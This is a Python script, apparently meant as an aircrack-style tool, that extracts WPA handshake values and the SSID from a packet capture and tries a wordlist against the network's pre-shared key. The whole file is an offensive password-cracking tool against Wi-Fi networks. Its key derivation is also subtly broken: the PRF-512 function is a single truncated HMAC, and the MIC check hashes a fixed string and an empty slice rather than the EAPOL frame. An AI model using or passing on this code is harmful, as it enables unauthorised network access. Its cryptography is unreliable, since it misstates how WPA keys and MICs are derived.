import sys
import hmac
import hashlib
from scapy.all import rdpcap, EAPOL, Dot11Beacon
import binascii
import argparse

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")
            
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")
            
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            if mic and snonce and sta_mac and bssid and anonce:
                break

        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    return mic, snonce, sta_mac, bssid, anonce, ssid

def prf512(key, a, b):
    return hmac.new(key, a + b, hashlib.sha1).digest()[:32]

def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
    ssid = ssid.encode()
    sta_mac = binascii.unhexlify(sta_mac.replace(':', ''))
    bssid = binascii.unhexlify(bssid.replace(':', ''))
    mic = binascii.unhexlify(mic.hex())

    for word in wordlist:
        word = word.strip()
        print(f"Trying PSK: {word}")
        psk = word.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
        print(f"PMK: {pmk.hex()}")

        ptk = prf512(pmk, b"Pairwise key expansion", min(sta_mac, bssid) + max(sta_mac, bssid) + anonce + snonce)
        print(f"PTK: {ptk.hex()}")

        mic_calc = hmac.new(ptk[:16], b"EAPOL Message" + mic[18:], hashlib.sha1).digest()[:16]
        print(f"Calculated MIC: {mic_calc.hex()}")
        
        if mic_calc == mic:
            print(f"Correct PSK found: {word}")
            return word

    print("No valid PSK found in wordlist.")
    return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack.py')
    parser.add_argument('capture_file', help='Capture file (CAP/PCAP)')
    parser.add_argument('-P', '--wordlist', required=True, help='Wordlist file')
    
    args = parser.parse_args()
    capture_file = args.capture_file
    wordlist_file = args.wordlist

    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(capture_file)
    
    if mic and snonce and sta_mac and bssid and anonce and ssid:
        with open(wordlist_file, 'r') as f:
            wordlist = f.readlines()
        crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist)
    else:
        print("Failed to extract necessary values from capture file.")
